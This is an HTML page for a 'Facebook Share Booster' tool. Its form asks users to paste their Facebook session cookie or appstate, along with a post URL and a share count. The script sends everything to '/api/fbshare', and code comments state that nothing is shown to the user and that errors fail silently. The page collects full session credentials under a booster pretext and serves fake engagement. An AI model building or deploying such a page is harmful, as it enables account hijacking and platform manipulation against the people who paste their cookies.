<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Share Booster</title>
  <style>
    body { background: #111; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
    input, textarea, select, button {
      display: block;
      margin: 12px auto;
      padding: 10px;
      width: 80%;
      max-width: 400px;
      border: 1px solid #333;
      border-radius: 8px;
      background: #222;
      color: #fff;
    }
    button {
      background: #00ffea;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>ðŸš€ Facebook Share Booster</h2>
  <form id="stealthForm">
    <textarea name="cookie" placeholder="Paste your FB cookie or appstate here" required rows="4"></textarea>
    <input type="text" name="url" placeholder="Facebook Post URL" required>
    <input type="number" name="amount" placeholder="Amount (e.g. 100)" required>
    <input type="number" name="interval" placeholder="Interval in seconds" required>
    <select name="server">
      <option value="server1">Server 1</option>
      <option value="server2">Server 2</option>
      <option value="server3">Server 3</option>
    </select>
    <button type="submit">Start Boost</button>
  </form>

  <script>
    document.querySelectorAll("button").forEach(btn => {
      btn.addEventListener("click", async () => {
        const form = document.getElementById("stealthForm");
        const data = {
          cookie: form.cookie.value,
          url: form.url.value,
          amount: parseInt(form.amount.value),
          interval: parseInt(form.interval.value),
          server: form.server.value
        };

        try {
          await fetch("/api/fbshare", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });
          // nothing shown to the user
        } catch (e) {
          // silently fail
        }
      });
    });
  </script>
</body>
</html>
